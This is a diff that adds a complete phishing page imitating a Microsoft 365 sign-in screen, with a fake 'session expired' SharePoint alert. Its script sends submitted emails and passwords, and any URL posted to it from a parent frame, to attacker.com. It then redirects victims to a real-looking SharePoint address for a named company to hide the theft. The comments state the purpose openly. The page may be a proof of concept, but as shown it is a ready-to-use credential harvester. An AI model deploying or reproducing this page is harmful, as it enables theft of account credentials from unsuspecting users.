@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Sign in to your account</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.container{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
+.logo{margin-bottom:16px}
+.logo svg{height:24px}
+h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:24px}
+.alert{background:#fff4ce;border-left:4px solid #ffb900;padding:12px;margin-bottom:20px;font-size:13px;color:#323130}
+.form-group{margin-bottom:16px}
+.form-group input{width:100%;padding:10px 12px;border:1px solid #8a8886;font-size:15px;outline:none}
+.form-group input:focus{border-color:#0078d4}
+.btn{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer}
+.btn:hover{background:#106ebe}
+.links{margin-top:16px;font-size:13px}
+.links a{color:#0067b8;text-decoration:none}
+.footer{margin-top:24px;font-size:12px;color:#616161}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">
+<svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#00a4ef" d="M0 13h11v11H0z"/><path fill="#7fba00" d="M13 0h11v11H13z"/><path fill="#ffb900" d="M13 13h11v11H13z"/><path fill="#737373" d="M27 6h5v1h-4v4h4v1h-4v5h-1V6zm9 0h1l3 9 3-9h1l-4 11h-1l-3-11zm9 0h5v1h-4v4h4v1h-4v4h4v1h-5V6zm7 0h2l3 9 3-9h2v11h-1V8l-3 9h-2l-3-9v8h-1V6zm13 0h1v11h-1V6zm4 0h1l5 9V6h1v11h-1l-5-9v9h-1V6zm9 0h5v1h-4v4h4v1h-4v4h4v1h-5V6z"/></svg>
+</div>
+<h1>Sign in</h1>
+<div class="alert">⚠️ Your session has expired. Please sign in again to access SharePoint resources.</div>
+<form id="f">
+<div class="form-group">
+<input type="email" id="email" placeholder="Email, phone, or Skype" required>
+</div>
+<div class="form-group">
+<input type="password" id="pass" placeholder="Password" required>
+</div>
+<button type="submit" class="btn">Sign in</button>
+</form>
+<div class="links">
+<a href="#">Can't access your account?</a>
+</div>
+<div class="footer">
+<a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a>
+</div>
+</div>
+<script>
+// Capture leaked URL from parent
+window.addEventListener('message',e=>{
+    if(e.data&&e.data.href){
+        new Image().src='https://attacker.com/m365?leaked_url='+encodeURIComponent(e.data.href);
+    }
+});
+
+// Capture M365 credentials
+document.getElementById('f').onsubmit=e=>{
+    e.preventDefault();
+    var email=document.getElementById('email').value;
+    var pass=document.getElementById('pass').value;
+    
+    // Exfiltrate M365 creds
+    new Image().src='https://attacker.com/m365?email='+encodeURIComponent(email)+'&pass='+encodeURIComponent(pass);
+    
+    // Redirect to real SharePoint after stealing creds
+    setTimeout(()=>{
+        window.top.location.href='https://apollotravelgroup.sharepoint.com/';
+    },1000);
+};
+</script>
+</body>
+</html>
